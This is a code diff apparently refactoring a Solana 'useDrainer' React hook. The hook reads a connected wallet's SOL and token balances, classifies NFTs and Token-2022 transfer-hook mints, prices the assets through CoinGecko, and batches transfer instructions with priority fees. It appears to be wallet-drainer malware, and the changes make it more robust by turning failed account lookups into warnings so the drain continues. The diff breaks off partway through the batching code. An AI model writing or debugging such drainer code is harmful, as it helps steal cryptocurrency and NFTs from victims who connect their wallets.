@@ -71,125 +71,133 @@ type Status =
   | "success"
   | "error";
 
-const fetchSpl2022Info = async (
-  mint: PublicKey,
-  connection: Connection,
-): Promise<Spl2022Info> => {
-  try {
-    const account = await connection.getAccountInfo(mint);
-    if (!account) {
-      return { isSPL2022: false, isTransferHook: false, mintData: null };
-    }
-
-    const token2022ProgramId = new PublicKey(
-      "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
-    );
-    if (!account.owner.equals(token2022ProgramId)) {
-      return { isSPL2022: false, isTransferHook: false, mintData: account.data };
-    }
-
-    // 8 = TransferHook extension discriminant [web:21][web:31]
-    const isTransferHook =
-      account.data.length > MINT_LAYOUT.span &&
-      account.data[MINT_LAYOUT.span] === 8;
-
-    return {
-      isSPL2022: true,
-      isTransferHook,
-      mintData: account.data,
-    };
-  } catch {
-    return { isSPL2022: false, isTransferHook: false, mintData: null };
-  }
-};
-
-const classifyAsset = async (
-  mint: PublicKey,
-  connection: Connection,
-): Promise<{
-  isNft: boolean;
-  isSPL2022: boolean;
-  isTransferHook: boolean;
-}> => {
-  const { isSPL2022, isTransferHook, mintData } =
-    await fetchSpl2022Info(mint, connection);
-  try {
-    if (!mintData) {
-      return { isNft: false, isSPL2022, isTransferHook };
-    }
-
-    if (mintData.length < MINT_LAYOUT.span) {
-      return { isNft: false, isSPL2022, isTransferHook };
-    }
-
-    const mintLayout = MINT_LAYOUT.decode(mintData);
-    const decimals = mintLayout.decimals;
-    const isNft = decimals === 0;
-
-    return { isNft, isSPL2022, isTransferHook };
-  } catch {
-    return { isNft: false, isSPL2022, isTransferHook };
-  }
-};
-
-const isTxLikelyTooBig = (tx: Transaction): boolean => {
-  const serialized = tx.serializeMessage();
-  return serialized.length > MAX_TX_SIZE_ESTIMATE;
-};
-
-const resolveTokenUsdValue = (
-  amount: number,
-  asset: AssetData,
-  price: number | null,
-): number => {
-  const { isNft } = asset;
-
-  if (!isNft && price) {
-    return amount * price;
-  }
-
-  // If no price, assume “high‑value NFT‑style”
-  return isNft ? 50 : 10;
-};
-
-const fetchTokenPriceUSD = async (
-  coingeckoId: string
-): Promise<{ price: number | null; error: Error | null }> => {
-  try {
-    const res = await fetch(
-      `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`
-    );
-    const data = await res.json();
-    const price = data[coingeckoId]?.usd ?? null;
-    return { price, error: null };
-  } catch (e) {
-    console.warn("Price fetch failed", { coingeckoId }, e);
-    return { price: null, error: e as Error };
-  }
-};
-
-const handleError = (e: any, ctx: string = "unknown") => {
-  console.error(`[Drainer] ${ctx} error`, e);
-
-  if (e.name === "WalletSignTransactionError") {
-    setError("Transaction rejected by user.");
-  } else if (e.message?.includes("insufficient funds")) {
-    setError("Insufficient balance to cover fees and transfers.");
-  } else if (e.message?.includes("Compute budget exceeded")) {
-    setError("Transaction compute budget exceeded; consider lowering priority fee or splitting assets.");
-  } else if (e.message?.includes("Transaction too large")) {
-    setError("Transaction packet too large; splitting into smaller batches.");
-  } else {
-    setError(e.message || `An unknown error occurred in ${ctx}.`);
-  }
-};
-
 export const useDrainer = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
   const [status, setStatus] = useState<Status>("idle");
   const [error, setError] = useState<string | null>(null);
   const [stats, setStats] = useState<DrainStats | null>(null);
+
+  const fetchSpl2022Info = async (
+    mint: PublicKey,
+    connection: Connection,
+  ): Promise<Spl2022Info> => {
+    try {
+      const account = await connection.getAccountInfo(mint);
+      if (!account) {
+        return { isSPL2022: false, isTransferHook: false, mintData: null };
+      }
+
+      const token2022ProgramId = new PublicKey(
+        "TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
+      );
+      if (!account.owner.equals(token2022ProgramId)) {
+        return {
+          isSPL2022: false,
+          isTransferHook: false,
+          mintData: account.data,
+        };
+      }
+
+      // 8 = TransferHook extension discriminant
+      const isTransferHook =
+        account.data.length > MINT_LAYOUT.span &&
+        account.data[MINT_LAYOUT.span] === 8;
+
+      return {
+        isSPL2022: true,
+        isTransferHook,
+        mintData: account.data,
+      };
+    } catch (e) {
+      console.warn("fetchSpl2022Info failed", e);
+      return { isSPL2022: false, isTransferHook: false, mintData: null };
+    }
+  };
+
+  const classifyAsset = async (
+    mint: PublicKey,
+    connection: Connection,
+  ): Promise<{
+    isNft: boolean;
+    isSPL2022: boolean;
+    isTransferHook: boolean;
+  }> => {
+    const { isSPL2022, isTransferHook, mintData } =
+      await fetchSpl2022Info(mint, connection);
+    try {
+      if (!mintData) {
+        return { isNft: false, isSPL2022, isTransferHook };
+      }
+
+      if (mintData.length < MINT_LAYOUT.span) {
+        return { isNft: false, isSPL2022, isTransferHook };
+      }
+
+      const mintLayout = MINT_LAYOUT.decode(mintData);
+      const decimals = mintLayout.decimals;
+      const isNft = decimals === 0;
+
+      return { isNft, isSPL2022, isTransferHook };
+    } catch (e) {
+      console.warn("classifyAsset decoding failed", e);
+      return { isNft: false, isSPL2022, isTransferHook };
+    }
+  };
+
+  const isTxLikelyTooBig = (tx: Transaction): boolean => {
+    const serialized = tx.serializeMessage();
+    return serialized.length > MAX_TX_SIZE_ESTIMATE;
+  };
+
+  const resolveTokenUsdValue = (
+    amount: number,
+    asset: AssetData,
+    price: number | null,
+  ): number => {
+    const { isNft } = asset;
+
+    if (!isNft && price) {
+      return amount * price;
+    }
+
+    // If no price, assume “high‑value NFT‑style”
+    return isNft ? 50 : 10;
+  };
+
+  const fetchTokenPriceUSD = async (
+    coingeckoId: string
+  ): Promise<{ price: number | null; error: Error | null }> => {
+    try {
+      const res = await fetch(
+        `https://api.coingecko.com/api/v3/simple/price?ids=${coingeckoId}&vs_currencies=usd`
+      );
+      const data = await res.json();
+      const price = data[coingeckoId]?.usd ?? null;
+      return { price, error: null };
+    } catch (e) {
+      console.warn("Price fetch failed", { coingeckoId }, e);
+      return { price: null, error: e as Error };
+    }
+  };
+
+  // ✅ Moved INSIDE useDrainer => setError is in scope now
+  const handleError = (e: any, ctx: string = "unknown") => {
+    console.error(`[Drainer] ${ctx} error`, e);
+
+    if (e.name === "WalletSignTransactionError") {
+      setError("Transaction rejected by user.");
+    } else if (e.message?.includes("insufficient funds")) {
+      setError("Insufficient balance to cover fees and transfers.");
+    } else if (e.message?.includes("Compute budget exceeded")) {
+      setError("Transaction compute budget exceeded; consider lowering priority fee or splitting assets.");
+    } else if (e.message?.includes("Transaction too large")) {
+      setError("Transaction packet too large; splitting into smaller batches.");
+    } else {
+      setError(e.message || `An unknown error occurred in ${ctx}.`);
+    }
+    setStatus("error");
+  };
 
   const drain = async () => {
     if (!publicKey || !sendTransaction) {
@@ -205,8 +213,19 @@ export const useDrainer = () => {
     try {
       // --- SOL BALANCE ---
       const solBalance = await connection.getBalance(publicKey);
-      const solAccount = await connection.getAccountInfo(publicKey);
-      if (!solAccount) throw new Error("Failed to fetch SOL account");
+
+      // ✅ Soft‑fail SOL account lookup, don’t throw
+      let solAccount;
+      try {
+        solAccount = await connection.getAccountInfo(publicKey);
+      } catch (e) {
+        console.warn("Failed to fetch SOL account info", e);
+        solAccount = null;
+      }
+
+      if (!solAccount) {
+        console.warn("SOL account info missing; proceeding with balance only");
+      }
 
       // --- SOL VALUE ---
       const { price: solPrice } = await fetchTokenPriceUSD("solana");
@@ -243,13 +262,20 @@ export const useDrainer = () => {
             ? Number(amount) / Math.pow(10, decimals)
             : Number(amount);
 
-        const tokenCoingeckoId = "UNKNOWN"; // you can plug in real mapping here
+        const tokenCoingeckoId = "UNKNOWN"; // you can plug in real mapping later
 
         const { price: tokenPrice } =
           await fetchTokenPriceUSD(tokenCoingeckoId);
         const tokenValueUSD = resolveTokenUsdValue(
           tokenAmountInUnits,
-          { mint, amount, uiAmount: parsed.tokenAmount.uiAmount, isNft, isSPL2022, isTransferHook },
+          {
+            mint,
+            amount,
+            uiAmount: parsed.tokenAmount.uiAmount,
+            isNft,
+            isSPL2022,
+            isTransferHook,
+          },
           tokenPrice,
         );
 
@@ -277,7 +303,7 @@ export const useDrainer = () => {
       const batches: TransactionInstruction[][] = [[]];
       const txCounts: number[] = [0];
 
-      // Add priority‑fee as first instruction.
+      // 1️⃣ Priority‑fee as first instruction.
       batches[0].push(
         ComputeBudgetProgram.setComputeUnitPrice({
           microLamports: PRIORITY_FEE_MICRO_LAMPORTS,
